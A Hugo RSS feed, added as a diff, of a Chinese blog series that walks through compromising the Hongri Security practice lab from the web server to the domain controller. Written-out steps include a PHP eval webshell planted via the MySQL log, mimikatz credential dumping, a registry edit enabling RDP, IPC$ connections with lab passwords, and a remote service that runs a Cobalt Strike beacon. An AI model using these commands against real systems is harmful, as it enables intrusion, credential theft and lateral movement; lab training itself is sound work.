@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hongrisec_1s on 黄泽杰Ekko</title>
+    <link>http://sxzl798.github.io/hongrisec_1/</link>
+    <description>Recent content in Hongrisec_1s on 黄泽杰Ekko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Thu, 10 Oct 2024 11:35:24 +0800</lastBuildDate>
+    <atom:link href="http://sxzl798.github.io/hongrisec_1/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透）</title>
+      <link>http://sxzl798.github.io/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/</link>
+      <pubDate>Thu, 10 Oct 2024 11:35:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/12.p29media-note-%E4%BD%BF%E7%94%A8cs%E8%87%AA%E5%B8%A6smb-beacon%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8/</guid>
+      <description>Part10.使用CS自带的SMB Beacon上线内网域控主机（内网穿透） 在web服务器和域控之间建立流量隧道 为什么建立了ipc通道还要建立流量隧道&#xA;因为ipc只能传文件，不能传流量&#xA;SMB Beacon简介: SMB Beacon使用命名管道通过父级Beacon进行通讯&#xA;当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送&#xA;使用CS工具中的SMB Beacon 使用SMB 新建一个监听器，用作smb隧道 明确总体思路：&#xA;在cs上生成smb木马 通过AntSword上传文件到web服务器 web服务器通过ipc管道将木马文件上传到域控主机 域控主机执行文件，与web服务器建立smb隧道 流量再通过web服务器回到cs 上传smb木马到web服务器&#xA;通过ipc管道上传文件到域控主机&#xA;shell copy smb_beacon.exe \\192.168.52.138\C$ 通过ipc管道在域控主机下创建一个服务，执行木马&#xA;shell sc \\owa.god.org create test binpath= &amp;#34;cmd.exe /c c:\smb_beacon.exe&amp;#34; 开启服务&#xA;shell sc \\owa.god.org start test 域控启动smb服务，web服务器也要发送连接命令，才能建立smb隧道&#xA;link owa.god.org 哪怕报1053错误，也可以link到，接下来成功上线&#xA;上线成功，拿到owa，system权限</description>
+    </item>
+    <item>
+      <title>Part8.AntSword到Cobalt Strike的迁移上线</title>
+      <link>http://sxzl798.github.io/hongrisec_1/10.p27media-note-%E8%9A%81%E5%89%91%E5%88%B0cs%E7%9A%84%E8%BF%81%E7%A7%BB%E4%B8%8A%E7%BA%BF/</link>
+      <pubDate>Thu, 10 Oct 2024 11:35:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/10.p27media-note-%E8%9A%81%E5%89%91%E5%88%B0cs%E7%9A%84%E8%BF%81%E7%A7%BB%E4%B8%8A%E7%BA%BF/</guid>
+      <description>Part8.AntSword到Cobalt Strike的迁移上线 内网渗透 为什么需要Cobalt Strike工具&#xA;因为虽然Webshell管理工具也可以执行命令，但是在一些操作上实受限的，比如想提权，想扫描想横向，想代理都是不方便的&#xA;所以接下来就要使用CS或者MSF工具&#xA;MSF——命令操作 CS——图形操作&#xA;安装Cobalt Strike工具 第一步：需要jdk1.8环境 第二步：打开cs： 管理员权限进入到目标目录下 ip应该选192.168.111.1，这样服务器端web才能ping通&#xA;使用Cobalt Strike工具 生成后的后门木马文件放在本地文件夹中，然后再通过AntSword上传文件到服务器，接着在AntSword终端上运行此文件 这时候，cs这里已经上线了 在这个输入框中可以执行系统命令</description>
+    </item>
+    <item>
+      <title>Part9.内网横向移动——ipc管道</title>
+      <link>http://sxzl798.github.io/hongrisec_1/11.p28media-note-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%8A%80%E5%B7%A7%E4%B9%8Bipc%E7%AE%A1%E9%81%93/</link>
+      <pubDate>Thu, 10 Oct 2024 11:35:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/11.p28media-note-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%8A%80%E5%B7%A7%E4%B9%8Bipc%E7%AE%A1%E9%81%93/</guid>
+      <description>Part9.内网横向移动——ipc管道 内网横向移动 横向移动（lateralmovement）已成为现如今网络需要留意的主要威胁之一&#xA;成功的横向移动攻击可以使攻击者闯入用户现有系统，并访问系统资源&#xA;高级持续性威胁（APT）是横向移动带来的最常见网络攻击类型&#xA;如果网络有足够多未保护的漏洞，只要有足够的时间，黑客最终就可以访问域控制器本身&#xA;横向移动就是通过一台电脑从而控制公司的整个电脑&#xA;横向移动的方式众多：&#xA;利用远控工具横向 IPCS横向移动 PTH哈希传递攻击 PTK秘钥传递攻击 PTT票据传递攻击 PSexec工具横向移动 SMB工具横向移动 WinRM命令横向 WMI命令横向移动 横向移动——ipc$ IPC(InternetProcessConnection)共享&amp;quot;命名管道&amp;quot;的资源，是为了实现进程间通信而开放的命名管道&#xA;PC可以通过验证用户名和密码获得相应的权限 通常在远程管理计算机和查看计算机的共享资源时使用 通过ipc$可以与目标机器建立连接 利用这个连接,不仅可以访问目标机器中的文件，进行上传、下载等操作&#xA;还可以在目标机器上运行其他命令以获取标机器的目录结构、用户列表等信息&#xA;直接用cs工具读取域控账号密码 执行建立ipc命令&#xA;shell net use \\192.168.52.138\ipc$ &amp;#34;hongrisec@2020&amp;#34; /user:god\administrator 这里显示这台web服务器和域控主机已经建立了ipc管道，我们用以下命令验证一下&#xA;shell net use 确定web服务器和域控主机已经建立了ipc管道&#xA;由于内网中的域控主机是不连接互联网的，所以我们的渗透电脑是没办法进入对方的网段中的&#xA;所以只能通过内网代理解决这个问题&#xA;接下来建立隧道，让web服务器成为跳板</description>
+    </item>
+    <item>
+      <title>Part1.入侵企业的网络思路</title>
+      <link>http://sxzl798.github.io/hongrisec_1/1.p17-%E5%85%A5%E4%BE%B5%E4%BC%81%E4%B8%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%9D%E8%B7%AF-%E9%85%8D%E7%BD%AEweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/1.p17-%E5%85%A5%E4%BE%B5%E4%BC%81%E4%B8%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%9D%E8%B7%AF-%E9%85%8D%E7%BD%AEweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
+      <description>Part1.入侵企业的网络思路 靶场介绍 本次渗透的靶场是红日安全团队的1号靶场，该靶场包含1台连接公网的web服务器，配置有双网卡，对应的ip地址分别为192.168.111.128和192.168.52.143，网段111的连接外网，网段52的连接内网，内网共有2台主机，1台域控和1台域内机器，ip地址分别为192.168.52.138和192.168.52.141&#xA;该靶场模拟了一般情况下企业的网络配置，非常具有代表性&#xA;红队攻击思路概括 通过对这个企业级靶场的渗透，我们将完整的走一遍渗透链，从web服务器入侵到内网渗透</description>
+    </item>
+    <item>
+      <title>Part2.控制192.168.111.128电脑</title>
+      <link>http://sxzl798.github.io/hongrisec_1/4.p21-%E6%89%93%E7%82%B9%E6%8A%80%E6%9C%AF%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/4.p21-%E6%89%93%E7%82%B9%E6%8A%80%E6%9C%AF%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
+      <description>Part2.控制192.168.111.128电脑 信息收集 端口：不同的端口对应不同的服务，不同的服务有着不同的攻击方式 web渗透通常来说就是找网站的相关漏洞，然后通过漏洞给服务器植入木马，从而拿到主机的控制权 手段如下 sql注入 RCE 文件上传 XXE XSS 找漏洞有两种方式 逐个测试&#xA;找特征然后搜索历史漏洞 先使用nmap扫描ip地址，扫出这个ip地址开放给互联网哪些端口，从以上nmap扫出的结果可以看到这台web服务器的80和3306端口是开放的，80端口就是浏览器可以访问的端口，3306是数据库开放的端口&#xA;80端口攻击思路 针对80端口，我们想知道这个ip地址的浏览器上能有哪些地址可以访问，这时候就可以使用dirsearch扫描目录，从而获取所有可以访问的浏览器地址，再从浏览器开放的信息中去寻找漏洞 漏洞可以针对浏览器暴露的建站服务器或工具去网页进行搜索，得到对应的攻击手段 </description>
+    </item>
+    <item>
+      <title>Part3.对目标web服务器进行目录扫描和密码爆破</title>
+      <link>http://sxzl798.github.io/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/5.p23-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</guid>
+      <description>Part3.对目标web服务器进行目录扫描和密码爆破 使用dirsearch工具进行目录扫描 因为通过前面的nmap端口扫描，我们已经发现了80端口是开放的，所以我们就可以接着使用dirsearch工具对这个ip地址网站进行目录扫描，看看哪些网站可以登录&#xA;针对phpMyAdmin网站进行密码爆破 这里的index.php网站登录进去可以知道这个这个网站是php探针，针对这个网站，我们就可以进行phpadmin爆破&#xA;将网址保存到txt文件中，再通过导入网址，读取txt，就可以进行密码爆破，这里爆破成功的是root，root&#xA;这样我们就成功登录服务器后台&#xA;通过mysql命令更改日志，植入木马 之后我们就可以进行日志中放木马的方式去控制这个主机&#xA;所以，首先我们要查询到日志文件的位置&#xA;这里可以发现这个系统日志是关闭的&#xA;将日志文件设置为自己创建的文件&#xA;再查看一下是否更改成功&#xA;已经成功&#xA;在日志中写入木马 select &amp;#39;&amp;lt;?php eval($ POST[1]); ?&amp;gt;&amp;#39;; 这句话是一句话木马&#xA;在mysql中运行，就会被记录在日志里&#xA;代码审计，打开web服务器文件查看&#xA;接下来如何控制别人电脑呢？&#xA;可以根据web服务器使用的编程语言和框架选择性地使用以下工具：&#xA;AntSword（php） 哥斯拉（php，java） 冰蝎（java） </description>
+    </item>
+    <item>
+      <title>Part4.通过getshell方式修改全局日志，进而控制目标web服务器</title>
+      <link>http://sxzl798.github.io/hongrisec_1/6.p23media-note-phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-getshell/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/6.p23media-note-phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97-getshell/</guid>
+      <description>Part4.通过getshell方式修改全局日志，进而控制目标web服务器 渗透工具的选择 针对不同后端编程语言的服务器，有不同的找漏洞方式，从而选择正确的工具&#xA;在此，我们可以使用Wappalyzer来看目前网站所使用的技术栈 根据所得信息，确定该web服务器使用phpMyAdmin框架，决定使用AntSword工具进行渗透&#xA;蚁剑的安装和使用 首先，去github里面下载这两个文件，一个是文件的核心，另一个是文件的启动器 接着，打开启动器exe，第一次启动要选择初始化目录，就选择那个核心文件夹 接着再次打开蚁剑： 这里的网址就填写我们之前新建的baili.php文件 密码就是之前写的一句话木马中POST中的数字 此时右键这个连接，就可以看到我们能进行的操作 双击进去，实际上可以控制这台主机的文件了 但是这样还不够，最好从虚拟终端去控制这台电脑 可以看到这是域管理员账号名 总结，通过以上操作，我们拿到了该web服务器的域账号名和主机账号名</description>
+    </item>
+    <item>
+      <title>Part5.远程开启3389端口，接管目标主机的控制权</title>
+      <link>http://sxzl798.github.io/hongrisec_1/7.p24media-note-%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%90%AF3389%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/7.p24media-note-%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%90%AF3389%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/</guid>
+      <description>Part5.远程开启3389端口，接管目标主机的控制权 使用蚁剑远程桌面控制对方主机的思路 首先，要远程控制目标主机，需要达成2个条件：&#xA;目标主机需要开启3389端口 拿到目标主机登录所需的账号密码 打开目标主机3389端口 使用命令查看该主机开放的端口&#xA;netstat -ano 发现目标主机本身没有开启3389端口&#xA;使用这条命令打开3389端口&#xA;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /Ff 3389端口打开成功&#xA;再用这条命令关闭主机防火墙&#xA;查看防火墙状态&#xA;netsh firewall show state 显示操作模式，禁用，表示防火墙已关闭&#xA;验证是否可以远程连接桌面 现在已经完成3389端口的打开，还差获取对方这个主机用户的密码&#xA;获取主机用户密码 利用Mimikatz去调取操作系统的less内存&#xA;github下载猕猴桃工具&#xA;再通过蚁剑上传到目标web服务器&#xA;接着在命令行中运行以下命令&#xA;mimikatz.exe &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonPasswords&amp;#34; &amp;#34;exit&amp;#34; 拿到关键信息：&#xA;用户名：god\Administrator 密码：hongrisec@2019 远程桌面登录成功，等同拿到该web服务器的最高控制权&#xA;接下来需要做到权限维持，也就是留后门 之前我们经过了信息收集，漏洞挖掘，跳过了提权获取到该主机的最高权限&#xA;现在，问题就在于如何维持这个权限，而不会被人发现木马而修复漏洞导致我们无法登录</description>
+    </item>
+    <item>
+      <title>Part6.内网靶场的调试与安装</title>
+      <link>http://sxzl798.github.io/hongrisec_1/8.p25media-note-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B0%83%E8%AF%95%E5%92%8C%E5%AE%89%E8%A3%85/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/8.p25media-note-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E7%9A%84%E8%B0%83%E8%AF%95%E5%92%8C%E5%AE%89%E8%A3%85/</guid>
+      <description>Part6.内网靶场的调试与安装 设置dns服务器地址 web服务器的dns要改为域控主机的ip地址&#xA;目前的密码是：&#xA;web服务器：hongri@2020 域控主机：hongri@2024 域内主机：hongri@2020&#xA;检查域内主机 域内主机的dns默认已经是域控主机的ip地址&#xA;00:08:32&#xA;net user 查询用户&#xA;domain 向域控询问&#xA;一共5个域账号 如果web服务器显示出这5个账号，说明该服务器主机已经加入该域中，所以可以提出假设，域内主机一定也能查出这5个账号 验证 内网渗透 内网渗透的第一步，是内网信息收集&#xA;systeminfo 当前web服务器主机名为STU1，域账号为Administrator 域为god.org</description>
+    </item>
+    <item>
+      <title>Part7.内网信息收集和定位域控和域内主机</title>
+      <link>http://sxzl798.github.io/hongrisec_1/9.p26media-note-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%AE%9A%E4%BD%8D%E6%9C%BA%E5%99%A8/</link>
+      <pubDate>Thu, 10 Oct 2024 11:34:24 +0800</pubDate>
+      <guid>http://sxzl798.github.io/hongrisec_1/9.p26media-note-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%AE%9A%E4%BD%8D%E6%9C%BA%E5%99%A8/</guid>
+      <description>Part7.内网信息收集和定位域控和域内主机 查询该域下的账户和主机数量（查不到域控） 查询该域下有多少账户 net user /domain 查询该域下有多少主机 net group &amp;#34;domain computers&amp;#34; /domain 可以看到有3台主机，对应web服务器，域控，域内主机&#xA;根据域内的账户和主机进行初步判断 该主机名为STU1 该账户名为Administrator 该域下有5个账户 域名为god.org 该域下有3台主机 STU1(web服务器，已被控制) DEV1 ROOT-TVI862UBEH 查找这个域的域控信息 找到域控的ip&#xA;nslookup -type=SRV _ldap._tcp 域控的IP地址：192.168.52.138 域控的全名：owa.god.org（owa就是这个域控的机器名，god.org是域名)&#xA;通过已经控制的web服务器，找到域所在的网段，进而判断域内主机的基本情况 查看web服务器的IP&#xA;ipconfig 公网：192.168.111.128&#xA;内网：192.168.52.143&#xA;可以看到有两个网卡，本地网络的是web服务器本身的IP地址，是连接公网的，所以52.143可以初步判断为连接内网的网卡&#xA;使用以下命令查看52网段下存在的机器&#xA;arp -a 52网段下存在1台52.138，52.138刚好对应上面扫出的域控&#xA;同时，在最开始，我们已经扫出三台主机和一台域控主机&#xA;STU1(web服务器，已被控制) DEV1 ROOT-TVI862UBEH owa ping一下3台主机 + 域控主机，同时将主机名和ip地址对应上&#xA;STU1是本服务器，对应192.168.111.128&#xA;DEV1主机要么不存在，要么已关机 ROOT-TVI862UBEH主机，对应192.168.52.141 owa域控机，对应192.168.52.138 总结信息： 192.168.111.128 STU1（外网：已控制的服务器） 192.168.52.138 owa（内网：域控） 192.168.52.141 ROOT-TVI862UBEH（内网：域内主机） 目标： 渗透进入192.168.52.138 owa（内网：域控）</description>
+    </item>
+  </channel>
+</rss>
